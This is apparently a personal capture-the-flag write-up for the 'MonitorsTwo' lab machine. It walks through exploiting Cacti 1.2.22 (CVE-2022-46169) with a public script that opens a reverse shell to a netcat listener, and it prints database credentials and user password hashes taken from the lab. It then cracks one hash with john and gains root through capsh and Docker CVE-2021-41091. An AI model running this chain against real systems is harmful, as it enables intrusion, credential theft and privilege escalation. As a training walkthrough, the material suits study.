# easy - MonitorsTwo (machine)

## User Flag

I wanted to write this down in spanish but I'm not that used to switch my keyboard layout between english and spanish in vim, so...
```bash
➤ curl -s http://monitorstwo/ | elinks --dump
   User Login
   Enter your Username and Password below
   Username [1]_____________________
   Password [2]_____________________
   [3][ ] Keep me signed in
   [4][ Login ]
   Version 1.2.22 | (c) 2004-2023 - The Cacti Group
```

So I remember this Cacti monitoring tool. Its getting interesting and nostalgic.

Scanning ports:
```bash
➤ sudo nmap -nv -Pn -sC -sV -O -T4 -oA nmap-scan monitorstwo
[sudo] password for n0kt:
sudo: nmap: command not found
```

Ok, I know I know, its been hard days.

I forgot some parameters purposes:

- -n/-R: Never do DNS resolution/Always resolve [default: sometimes]
- -v: Increase verbosity level (use -vv or more for greater effect)
- -Pn: Treat all hosts as online -- skip host discovery
- -sV: Probe open ports to determine service/version info
- -sC: equivalent to --script=default
- -O: Enable OS detection
- -T4 for faster execution; and then the hostname.

By the way, these ports are open:
```bash
➤ cat nmap-scan.nmap | ag open
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

So we are using cacti v 1.2.22
```bash
➤ curl -s http://monitorstwo | ag version
                <div class='versionInfo'>Version 1.2.22 | (c) 2004-2023 - The Cacti Group</div>
```

A quick googlefu says this CVE-2022-46169 is related. So I've found couple of exploits, one github repo that was recently created (strange, maybe the machine author?) and one from the classic exploit-db:

- https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22
- https://www.exploit-db.com/exploits/51166

Both exloits are the same, just written in a different way, both injects a payload on file `remote_agent.php` on parameter `poller_id`.

```bash
# Attacker
➤ python3 51166.py -u http://monitorstwo --LHOST=10.10.14.3 --LPORT=55555


➤ nc -lvnp 55555
Connection from 10.10.11.211:51492
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@50bca5e748b0:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Looking for something useful:
```bash
# DB Creds!
$ grep -Ri database_ include/config.php
grep -Ri database_ include/config.php
$database_type     = 'mysql';
$database_default  = 'cacti';
$database_hostname = 'db';
$database_username = 'root';
$database_password = 'root';
$database_port     = '3306';
$database_retries  = 5;
$database_ssl      = false;
$database_ssl_key  = '';
$database_ssl_cert = '';
$database_ssl_ca   = '';
$database_persist  = false;


$ mysql --version
mysql --version
mysql  Ver 15.1 Distrib 10.5.15-MariaDB, for debian-linux-gnu (x86_64) using  EditLine wrapper

# Worked!
$ mysql -h db -u root -p -e "show databases;"
<w/html$ mysql -h db -u root -p -e "show databases;"
Enter password: root
Database
information_schema
cacti
mysql
performance_schema
sys

# Got this, now I just need to crack those hases
$ mysql -h db -u root -p -e "use cacti; select username, password, email_address from user_auth;"
< username, password, email_address from user_auth;"
Enter password: root
username        password        email_address
admin   $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC    admin@monitorstwo.htb
guest   43e9a4ab75570f5b
marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C    marcus@monitorstwo.htb
```

So I left my friend `john` working, the passwsord it got was not for Cacti but for marcus ssh connection.
```bash
➤ john -w=/usr/share/dict/rockyou.txt hashes.txt
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
...
funkymonkey      (?)

marcus@monitorstwo:~$ id
uid=1000(marcus) gid=1000(marcus) groups=1000(marcus)
marcus@monitorstwo:~$ ls
user.txt
```

## Root Flag

So marcus doesn't have sudo privs, there is no cronjobs for the user. But I've found something in the system processes:
```bash
marcus@monitorstwo:~$ ps aux | vim -
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         900  0.0  2.1 1455488 85572 ?       Ssl  Jun07   0:04 /usr/sbin/dockerd -H fd://
root         905  0.0  0.0   6816  2928 ?        Ss   Jun07   0:00 /usr/sbin/cron -f
root         909  0.3  0.8 1410928 34616 ?       Ssl  Jun07   0:29 /usr/bin/containerd
root         924  0.0  0.0  51212  1496 ?        Ss   Jun07   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
www-data     925  0.0  0.1  51776  5264 ?        S    Jun07   0:00 nginx: worker process
www-data     926  0.0  0.1  51908  6044 ?        S    Jun07   0:00 nginx: worker process
root        1231  0.0  0.2 1452188 10896 ?       Sl   Jun07   0:00 /usr/bin/containerd-shim-runc-v2 -namespace moby -id e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69 -address /run/containerd/containerd.sock
root        1332  0.0  0.0 1223816 3096 ?        Sl   Jun07   0:00 /usr/sbin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8080 -container-ip 172.19.0.3 -container-port 80
root        1347  0.0  0.2 1527072 10152 ?       Sl   Jun07   0:00 /usr/bin/containerd-shim-runc-v2 -namespace moby -id 50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e -address /run/containerd/containerd.sock
systemd+    1602  0.0  0.3  24576 12164 ?        Ss   Jun07   0:01 /lib/systemd/systemd-resolved
root        1829  0.0  0.7 384860 29316 ?        Ssl  00:22   0:00 /usr/libexec/fwupd/fwupd
root        1834  0.0  0.2 241192  9604 ?        Ssl  00:22   0:00 /usr/lib/upower/upowerd

$ containerd --version
containerd github.com/containerd/containerd 1.4.5~ds1 1.4.5~ds1-2+deb11u1

$ docker -v
Docker version 20.10.5+dfsg1, build 55c4c88
```

Also, notice that nginx process running, wasn't it apache2?
```bash
$ grep -R server_name /etc/nginx/*
/etc/nginx/sites-available/default:     server_name cacti.monitorstwo.htb;
/etc/nginx/sites-enabled/default:       server_name cacti.monitorstwo.htb;
```

I got it, apache2 is running inside a container where Cacti is hosted and via docker-proxy it is being exposed from port 8080 to port 80 via Nginx.

So I've noticed those containerd and docker versions:

- Containerd 1.4.5 has CVE-2021-41103
- Docker 20.10.5 has CVE-2021-41091  (https://docs.docker.com/engine/release-notes/20.10/)

The docker one is interesting, an attacker can manipulate base system files (/var/lib/docker) from within a container via SUID.

So let's connect back to the cacti container using the cacti remote shell vuln we saw before.

```bash
# Search for a SUID bin file
www-data@50bca5e748b0:/var/www/html$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/sbin/capsh
/bin/mount
/bin/umount
/bin/su

www-data@50bca5e748b0:/var/www/html$ capsh --gid=0 --uid=0 --
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
chmod u+s /bin/bash
```

And now from marcus ssh connection:
```bash
marcus@monitorstwo:~$ ./exploit.sh
[!] Vulnerable to CVE-2021-41091
[!] Now connect to your Docker container that is accessible and obtain root access !
[>] After gaining root access execute this command (chmod u+s /bin/bash)

Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
[!] Available Overlay2 Filesystems:
/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

[!] Iterating over the available Overlay2 filesystems !
[?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
[x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'

[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[!] Rooted !
[>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[?] If it didn't spawn a shell go to this path and execute './bin/bash -p'

[!] Spawning Shell
bash-5.1# exit
```

And voilá:
```bash
marcus@monitorstwo:~$ /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p
bash-5.1# id
uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)
bash-5.1# ls /root
cacti  root.txt
```
